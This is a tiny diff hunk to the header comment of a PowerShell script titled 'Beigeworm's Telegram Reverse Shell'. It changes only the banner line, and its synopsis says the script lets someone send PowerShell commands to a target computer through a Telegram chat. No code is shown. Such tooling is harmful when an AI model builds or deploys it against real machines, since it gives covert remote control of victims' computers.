@@ -1,5 +1,5 @@
 <#
-============================================== Beigeworm's Telegram Reverse Shell =======================================================
+============================================== Beigeworm's Telegram Reverse Shell ======================================================
 
 SYNOPSIS
 This script connects target computer with a telegram chat to send powershell commands.
